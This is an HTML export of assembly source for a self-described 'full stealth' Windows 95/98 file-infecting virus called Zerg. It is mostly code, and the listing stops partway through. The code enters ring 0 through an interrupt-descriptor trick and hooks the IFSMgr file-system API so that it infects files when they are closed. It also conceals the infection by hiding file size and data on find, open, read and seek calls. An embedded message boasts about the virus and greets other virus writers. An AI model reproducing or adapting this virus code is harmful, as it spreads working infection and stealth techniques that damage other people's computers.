<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc5">infected_sign</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc12">'DS'</span><span class="sc0">

</span><span class="sc1">; for test</span><span class="sc0">
</span><span class="sc5">remove_sign</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'BYE'</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">vxd.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">vmm.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">ifs.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">ifsext.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">filehead.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">Zerg.inc</span><span class="sc0">

</span><span class="sc5">vir_size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">vir_end</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">vir_file_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">vir_file_end</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">vir_mem_size</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">vir_mem_end</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc2">.386p</span><span class="sc0">
                </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">
                </span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; for return host</span><span class="sc0">
                </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">run_host</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_delta</span><span class="sc0">
</span><span class="sc5">_delta</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_delta</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">under_win95</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-(</span><span class="sc5">ret_</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">vir_entry_point</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">host_data</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">HostData</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)</span><span class="sc5">.pe_inhs.</span><span class="sc0"> \
                                  </span><span class="sc5">OptionalHeader.AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_ret</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
</span><span class="sc5">ret_</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">seh</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">remove_seh</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">run_host</span><span class="sc0">

</span><span class="sc5">under_win95</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">seh</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sidt</span><span class="sc0">    </span><span class="sc10">fword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">int0</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">remove_seh</span><span class="sc0">


</span><span class="sc5">msg</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' -=#[Zerg v0.1 Beta]#=- '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'The World First Full Stealth virus for Win95/98, '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Written by Dark Slayer in Keelung, Taiwan (ROC). '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'This is a Demo and Lame virus. '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"It's Show that How to Make a Full Stealth virus on "</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'IFSMgr, and Directly Call into FSD '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'without the Fucking IFSMgr_Ring0_FileIO. '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"It's not Finished yet at All, "</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Keeping watch My Next virus, Next Generation... '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"It'll be A Partition/BOOT/COM/EXE/NEXE/PEXE/"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Polymorphic/Full Stealth/Multi-Platform Infector. '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Greeting to all Virus Writer, '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Bye! ^_^ '</span><span class="sc0">


</span><span class="sc5">int0</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">vir_mem_size</span><span class="sc0">
</span><span class="sc5">VxDCall0</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_GetHeap</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">int0_exit</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc5">vir_mem_size</span><span class="sc4">+</span><span class="sc5">IFSHook</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">VxDCall1</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">int0_retHeap_exit</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc5">vir_mem_size</span><span class="sc4">+</span><span class="sc5">prevIFSHookAddr</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc5">vir_mem_size</span><span class="sc4">+</span><span class="sc5">IFSMgrIFSApiHook</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc5">vir_mem_size</span><span class="sc4">+</span><span class="sc5">VxDCall1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc5">vir_mem_size</span><span class="sc4">+</span><span class="sc5">IFSMgrIFSApiHookAddr</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">


                </span><span class="sc1">; follow line for test remove function</span><span class="sc0">
                </span><span class="sc1">;mov     ds:[edi-vir_mem_size+remove_addr-start],ebx</span><span class="sc0">


</span><span class="sc5">int0_exit</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">iretd</span><span class="sc0">

</span><span class="sc5">int0_retHeap_exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">vir_mem_size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">VxDCall2</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_RetHeap</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int0_exit</span><span class="sc0">


</span><span class="sc5">IFSMgrIFSApiHook</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">


                </span><span class="sc1">; for test</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc5">remove_sign</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_remove</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_deltaX</span><span class="sc0">
</span><span class="sc5">_deltaX</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc1">;                mov     ecx,0</span><span class="sc0">
</span><span class="sc1">;remove_addr     =       dword ptr $-4</span><span class="sc0">
</span><span class="sc1">;                mov     eax,ds:[ebx+IFSMgrIFSApiHookAddr-_deltaX]</span><span class="sc0">
</span><span class="sc1">;                mov     ds:[ecx],eax</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IFSHook</span><span class="sc4">-</span><span class="sc5">_deltaX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_RemoveFileSystemApiHook</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">remove_sign</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">IFSMgrIFSApiHookRet</span><span class="sc0">
</span><span class="sc5">not_remove</span><span class="sc4">:</span><span class="sc0">


                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc5">infected_sign</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_me</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">IFSMgrIFSApiHookRet</span><span class="sc0">

</span><span class="sc5">not_me</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_delta1</span><span class="sc0">
</span><span class="sc5">_delta1</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IFSHook</span><span class="sc4">-</span><span class="sc5">_delta1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">VxDCall3</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_RemoveFileSystemApiHook</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">IFSMgrIFSApiHookAddr</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">prevIFSHookAddr</span><span class="sc4">-</span><span class="sc5">IFSHook</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">IFSMgrIFSApiHookRet</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">tsr_sign</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">infected_sign</span><span class="sc0">

</span><span class="sc5">IFSHook</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">c</span><span class="sc4">,</span><span class="sc5">FSDFnAddr</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc5">FunctionNum</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc5">Drive</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc0"> \
                          </span><span class="sc5">ResourceFlags</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc5">CodePage</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc5">pir</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
                </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">pifshp</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
                </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pifshp</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">FunctionNum</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_CLOSE</span><span class="sc0">          </span><span class="sc1">; infect</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">FuncCloseFile</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_FINDOPEN</span><span class="sc0">       </span><span class="sc1">; stealth size</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">FuncFindFile</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_FINDNEXT</span><span class="sc0">       </span><span class="sc1">; stealth size</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">FuncFindFile</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_READ</span><span class="sc0">           </span><span class="sc1">; stealth data</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">FuncReadFile</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_WRITE</span><span class="sc0">          </span><span class="sc1">; disinfect file</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">FuncWriteFile</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">        </span><span class="sc1">; stealth size &amp; modify open mode</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">FuncOpenFile</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_SEARCH</span><span class="sc0">         </span><span class="sc1">; stealth size</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">FuncSearchFile</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_SEEK</span><span class="sc0">           </span><span class="sc1">; stealth size</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">FuncFileSeek</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_ENUMHANDLE</span><span class="sc0">     </span><span class="sc1">; stealth size</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">FuncEnumerateHandle</span><span class="sc0">

</span><span class="sc5">toNextIFSHook</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RetIfshp</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prevIFSHook</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">returnIFSHook</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RetIfshp</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">IFSHook</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">prevIFSHook</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushfd</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
